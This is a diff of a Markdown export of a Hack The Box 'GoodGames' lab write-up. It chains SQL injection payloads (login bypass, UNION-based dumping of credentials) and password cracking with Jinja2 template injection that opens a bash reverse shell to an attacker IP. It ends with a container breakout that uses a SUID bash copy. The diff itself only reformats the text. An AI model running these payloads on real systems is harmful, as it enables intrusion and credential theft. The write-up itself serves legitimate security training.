@@ -1,14 +1,14 @@
-# 🚀 From Login Form to Root Access: Chaining SQLi & SSTI for Total Compromise
+# GoodGames
 
 \*\*Not a Member?? Click Here to Read Full-Story!\*\*
 
----
+***
 
 ### 🚀 From Login Form to Root Access: Chaining SQLi & SSTI for Total Compromise
 
 ![](https://cdn-images-1.medium.com/max/800/1*q_zXakJCJZdibF_8YKg8pA.png)
 
-**Target:** *GoodGames (Hack The Box)* **OS:** *Linux* **Difficulty:** *Easy* Attack Vectors: *Web Exploitation -\> Container Breakout* **Author:** *R00t3dbyFa17h\Nicholas Mullenski*
+**Target:** _GoodGames (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ Attack Vectors: _Web Exploitation -> Container Breakout_ **Author:** _R00t3dbyFa17h\Nicholas Mullenski_
 
 ⚠️ **Disclaimer:** This article is for educational and security auditing purposes only. All demonstrations were performed on the “GoodGames” machine within the Hack The Box lab environment. Never attempt to access or modify systems without explicit written permission from the owner.
 
@@ -18,11 +18,11 @@ This assessment targeted “GoodGames,” a Linux-based server hosting a gaming 
 
 Root privilege escalation was accomplished by enumerating the container environment and discovering that the host’s root filesystem was mounted within the container. This misconfiguration allowed for a container breakout, granting full administrative access (Root) to the underlying host system.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance and Enumeration
 
-1.  <span id="94b2">**1.1 Scanning the Target:** The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target.</span>
+1. **1.1 Scanning the Target:** The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target.
 
 ```
 nmap -sC -sV -A -vvv -p- 10.10.11.130
@@ -41,11 +41,11 @@ PORT   STATE SERVICE VERSION
 
 **1.1.2 Key Findings:**
 
-- <span id="ba47">**Port 80 (HTTP):** The primary attack vector. The header `Werkzeug/2.0.2 Python/3.9.2` confirms this is a Python-based web application (Flask).</span>
+* **Port 80 (HTTP):** The primary attack vector. The header `Werkzeug/2.0.2 Python/3.9.2` confirms this is a Python-based web application (Flask).
 
 #### 1.2 Web Application Enumeration
 
-1.  <span id="41d0">**2.1 Analysis:** Navigating to `http://goodgames.htb` reveals a gaming news site. The application features a login page (`/login`) and a registration page (`/signup`).</span>
+1. **2.1 Analysis:** Navigating to `http://goodgames.htb` reveals a gaming news site. The application features a login page (`/login`) and a registration page (`/signup`).
 
 ![](https://cdn-images-1.medium.com/max/800/1*TWzWJ-9Uo5A1-M1BiBI47Q.png)
 
@@ -53,52 +53,52 @@ PORT   STATE SERVICE VERSION
 
 **1.2.3 Exploitation:** We utilized a classic authentication bypass payload.
 
-- <span id="ee91">**Payload:** `' OR 1=1 -- -`</span>
-- <span id="9314">**Result:** The application accepted the condition as true and logged us in as the first user in the database (Admin), bypassing the password requirement entirely.</span>
+* **Payload:** `' OR 1=1 -- -`
+* **Result:** The application accepted the condition as true and logged us in as the first user in the database (Admin), bypassing the password requirement entirely.
 
 ![](https://cdn-images-1.medium.com/max/800/1*04LHBlxYyohaNkJRstDZMg.png)
 
 #### 1.3 Advanced Exploitation (Data Exfiltration)
 
-**1.3.1 Determining the Injection Type:** While the initial `OR 1=1` payload granted access, we observed that the application reflected the user's name on the dashboard ("Welcome \[Name\]"). This behavior suggested that the results of the SQL query were being displayed on the page, making it a prime candidate for a **UNION-based SQL Injection**.
+**1.3.1 Determining the Injection Type:** While the initial `OR 1=1` payload granted access, we observed that the application reflected the user's name on the dashboard ("Welcome \[Name]"). This behavior suggested that the results of the SQL query were being displayed on the page, making it a prime candidate for a **UNION-based SQL Injection**.
 
 **1.3.2 Enumeration:** We intercepted the login request in Burp Suite to fuzz the query.
 
-- <span id="0220">**Column Count:** We injected `ORDER BY` clauses and `UNION SELECT` statements to determine the number of columns in the original query.</span>
-- <span id="c45d">**Payload:** `' UNION SELECT 1,2,3,4-- -`</span>
-- <span id="21e2">**Result:** The page responded with “Welcome 4”. This confirmed the query uses **4 columns** and the **4th column** is the one displayed to the user.</span>
+* **Column Count:** We injected `ORDER BY` clauses and `UNION SELECT` statements to determine the number of columns in the original query.
+* **Payload:** `' UNION SELECT 1,2,3,4-- -`
+* **Result:** The page responded with “Welcome 4”. This confirmed the query uses **4 columns** and the **4th column** is the one displayed to the user.
 
 ![](https://cdn-images-1.medium.com/max/800/0*a5Ot8n5yQGW3Ii4f)
 
 **1.3.3 Database Dumping:** Leveraging the 4th column as our data extraction point, we began enumerating the schema.
 
-- <span id="febd">**Current Database:**</span>
-- <span id="2bb5">**Payload:** `' UNION SELECT 1,2,3,database()-- -`</span>
-- <span id="19b7">**Result:** `main`</span>
+* **Current Database:**
+* **Payload:** `' UNION SELECT 1,2,3,database()-- -`
+* **Result:** `main`
 
 #### **Listing Tables:**
 
-- <span id="ec7d">**Payload:**</span>
+* **Payload:**
 
 ```
 ' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema='main'-- -
 ```
 
-- <span id="5560">**Result:** `blog, blog_comments, user`</span>
+* **Result:** `blog, blog_comments, user`
 
-#### **Listing Columns (User Table):**
+#### **Listing Columns (User Table):**
 
-- <span id="898a">**Payload:**</span>
+* **Payload:**
 
 ```
 ' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='user'-- -
 ```
 
-- <span id="48fb">**Result:** `id, email, password, name`</span>
+* **Result:** `id, email, password, name`
 
 **1.3.4 Dumping Credentials:** Finally, we extracted the data from the `user` table.
 
-- <span id="ccf1">**Payload:**</span>
+* **Payload:**
 
 ```
 ' UNION SELECT 1,2,3,group_concat(id,':',email,':',password) FROM user-- -
@@ -110,7 +110,7 @@ Result:
 1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
 ```
 
-#### 1.4 Password Cracking
+#### 1.4 Password Cracking
 
 **1.4.1 Hash Identification:** We successfully extracted the administrator’s password hash: `2b22337f218b2d82dfc3b6f77e7cb8ec`. Based on the length and format, this was identified as a standard **MD5** hash.
 
@@ -118,18 +118,18 @@ Result:
 
 **1.4.2 Cracking:** We checked the hash against online databases (or used hashcat).
 
-- <span id="8688">**Hash:** `2b22337f218b2d82dfc3b6f77e7cb8ec`</span>
-- <span id="40d7">**Cracked Value:** `superadministrator`</span>
+* **Hash:** `2b22337f218b2d82dfc3b6f77e7cb8ec`
+* **Cracked Value:** `superadministrator`
 
 ![](https://cdn-images-1.medium.com/max/800/1*cb_9JrDNeh7dUzBnZdi9iA.png)
 
 **1.4.3 Strategic Value:** Even though we could bypass the login with SQLi, cracking this password is critical. Users often reuse passwords across services (SSH, Database, Root). We noted this credential (`admin:superadministrator`) for later use.
 
-### 2.0 Exploitation (SSTI to RCE)
+### 2.0 Exploitation (SSTI to RCE)
 
 #### 2.1 Internal Reconnaissance
 
-With the `admin` credentials (`admin:superadministrator`), we logged into the web application. The dashboard provides a "Settings" gear icon in the top right, leading to <a href="http://goodgames.htb/settings." class="markup--anchor markup--p-anchor" data-href="http://goodgames.htb/settings." rel="noopener" target="_blank"><code class="markup--code markup--p-code">http://goodgames.htb/settings</code></a><a href="http://goodgames.htb/settings." class="markup--anchor markup--p-anchor" data-href="http://goodgames.htb/settings." rel="noopener" target="_blank">.</a>
+With the `admin` credentials (`admin:superadministrator`), we logged into the web application. The dashboard provides a "Settings" gear icon in the top right, leading to [`http://goodgames.htb/settings`](http://goodgames.htb/settings.)[.](http://goodgames.htb/settings.)
 
 This page allows the user to update their “Full Name.”
 
@@ -153,17 +153,17 @@ This page allows the user to update their “Full Name.”
 
 **2.2.2 Execution:** The server responded with `uid=0(root) gid=0(root) groups=0(root)`.
 
-- <span id="cabc">*Note:* Although we are “root,” the environment looked suspicious. The hostname was a random hash (e.g., `3a453...`), indicating we were inside a Docker container, not the actual host.</span>
+* _Note:_ Although we are “root,” the environment looked suspicious. The hostname was a random hash (e.g., `3a453...`), indicating we were inside a Docker container, not the actual host.
 
 **2.2.2 Gaining a Reverse Shell:** We set up a listener on our attack box (`nc -lvnp 4444`) and injected a bash reverse shell payload.
 
-- <span id="5118">**Payload**</span>
+* **Payload**
 
 ```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"').read() }}
 ```
 
-*(Replace* *`10.10.14.x`* *with your specific tun0 IP).*
+_(Replace_ _`10.10.14.x`_ _with your specific tun0 IP)._
 
 **2.3 User Flag:** The shell connected back successfully. We found the user flag in the home directory of the user `augustus`.
 
@@ -217,7 +217,7 @@ Filesystem      Size  Used Avail Use% Mounted on
 
 **4.1.1** We are `augustus` on the host, but `root` inside the container. Since the file system is shared, we can create a file as `root` inside the container and execute it as `augustus` on the host.
 
-#### 4.2 The Library Mismatch Error
+#### 4.2 The Library Mismatch Error
 
 **4.2.1** We initially tried copying `/bin/bash` from the container to the host.
 
@@ -228,7 +228,7 @@ augustus@GoodGames:~$ ./secret_shell -p
 
 **4.2.2** This failed due to OS differences between the container (Debian) and Host (Ubuntu).
 
-#### 4.3 The Fix (Using Host Bash)
+#### 4.3 The Fix (Using Host Bash)
 
 We copied the **Host’s** bash binary instead.
 
@@ -251,7 +251,7 @@ chmod 4777 /home/augustus/rootbash
 ./rootbash -p
 ```
 
-#### 4.4 Root Flag:
+#### 4.4 Root Flag:
 
 ```
 rootbash-5.1# id
@@ -270,17 +270,17 @@ While the initial entry point was a standard web vulnerability (SQL Injection), 
 
 **Key Takeaways for Leadership:**
 
-1.  <span id="8f37">**Defense in Depth is Mandatory:** Relying solely on a firewall or a container is insufficient. Security controls must exist at the application layer (Input Validation), the host layer (Least Privilege), and the network layer (Segmentation).</span>
-2.  <span id="a0ce">**Configuration Management:** The most dangerous vulnerabilities often aren’t “bugs” in the code, but misconfigurations in the deployment (e.g., the Docker mount). Regular auditing of infrastructure-as-code is essential.</span>
-3.  <span id="8416">**The Cost of Inaction:** A breach of this magnitude allows for total data exfiltration, ransomware deployment, and persistent backdoors, posing a severe reputational and financial risk to the organization.</span>
+1. **Defense in Depth is Mandatory:** Relying solely on a firewall or a container is insufficient. Security controls must exist at the application layer (Input Validation), the host layer (Least Privilege), and the network layer (Segmentation).
+2. **Configuration Management:** The most dangerous vulnerabilities often aren’t “bugs” in the code, but misconfigurations in the deployment (e.g., the Docker mount). Regular auditing of infrastructure-as-code is essential.
+3. **The Cost of Inaction:** A breach of this magnitude allows for total data exfiltration, ransomware deployment, and persistent backdoors, posing a severe reputational and financial risk to the organization.
 
 As a penetration tester, my role is not just to break in, but to identify these structural weaknesses and provide actionable roadmaps to harden the organization against real-world threats.
 
----
+***
 
 ### 6.0 The Spiritual & CyberSecurity Tie-in
 
-> “Above all else, guard your heart, for everything you do flows from it.”* — ****Proverbs 4:23 (NIV)***
+> “Above all else, guard your heart, for everything you do flows from it.”\* — \*_**Proverbs 4:23 (NIV)**_
 
 **The Connection:** In this lab, the “heart” of the application — its database and internal logic — was left unguarded. The developers allowed raw, unfiltered input to flow directly into the SQL database and the Template Engine. Furthermore, the Docker container was intended to be a secure vessel, but because the internal file system (the heart of the host’s data) was mounted insecurely, the boundary was breached.
 
@@ -288,8 +288,8 @@ Just as Proverbs warns that a corrupted heart affects everything a person does, 
 
 **“Guard the input, isolate the process, secure the heart.”**
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 27, 2025](https://medium.com/p/11c77f0d3539).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 27, 2025](https://medium.com/p/11c77f0d3539).
 
-<a href="https://medium.com/@nicholasmullenski/from-login-form-to-root-access-chaining-sqli-ssti-for-total-compromise-11c77f0d3539" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/from-login-form-to-root-access-chaining-sqli-ssti-for-total-compromise-11c77f0d3539)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
